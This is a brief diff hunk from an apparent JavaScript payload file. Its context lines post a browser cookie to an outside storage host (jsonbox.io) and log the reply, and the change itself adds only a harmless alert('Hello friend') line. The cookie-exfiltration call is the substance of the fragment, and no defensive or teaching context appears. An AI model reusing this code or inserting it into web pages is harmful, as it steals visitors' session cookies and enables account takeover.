@@ -21,3 +21,5 @@ postData('https://jsonbox.io/box_8f9a9772eb37b3694de8', { cookie })
   .then(data => {
   console.log(data);
 });
+
+alert('Hello friend');
